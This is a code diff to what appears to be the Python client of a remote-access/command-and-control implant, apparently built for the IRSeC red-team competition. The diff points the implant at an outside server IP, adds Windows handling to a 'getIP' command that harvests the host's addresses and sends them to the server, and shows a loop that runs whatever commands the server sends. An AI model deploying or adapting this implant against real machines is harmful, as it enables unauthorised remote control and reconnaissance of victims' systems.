@@ -69,7 +69,7 @@ try: #If the user does not have this input, skip it
 except:
     pass
 
-SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
+SERVER_HOST = "129.21.49.57" #DEFAULT SERVER HOST
 SERVER_PORT = 8080 #DEFAULT SERVER PORT
 BUFFER_SIZE = 1024 * 128 #128KB max size
 
@@ -225,15 +225,17 @@ def clientLoop():
                 s.close()
                 break
             elif "getIP" in command:
-                OS = subprocess.run("uname -s", shell=True,capture_output=True,text=True).stdout
-                regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})|(172\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC, look for 127.X.X.X, 172.X.X.X, or 10.X.X.X
-                # regex2 = re.compile(r'(172\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC
-                # regex3 = re.compile(r'(127\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC - test
-                if "Darwin" in OS:
-                    out = subprocess.run("ifconfig | grep inet", shell=True,capture_output=True,text=True).stdout
+                OS = os.name
+                if OS == "nt": #if it's windows, run ipconfig | findstr
+                    out = subprocess.run("ipconfig | findstr IPv4", shell=True,capture_output=True,text=True).stdout
                 else:
-                    out = subprocess.run("ip a | grep inet", shell=True,capture_output=True,text=True).stdout
-                out = str(out)
+                    OS = subprocess.run("uname -s", shell=True,capture_output=True,text=True).stdout
+                    if "Darwin" in OS:
+                        out = subprocess.run("ifconfig | grep inet", shell=True,capture_output=True,text=True).stdout
+                    else:
+                        out = subprocess.run("ip a | grep inet", shell=True,capture_output=True,text=True).stdout
+                regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})|(172\.\d{1,2}\.\d{1,3}\.\d{1,3})|(127\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC, look for 127.X.X.X, 172.X.X.X, or 10.X.X.X
+                out = str(out).strip()
                 IP = regex.search(out)[0]
                 s.send(str(IP).encode())
             else: #if the user doesn't want to perform a special action, run the command and capture the output
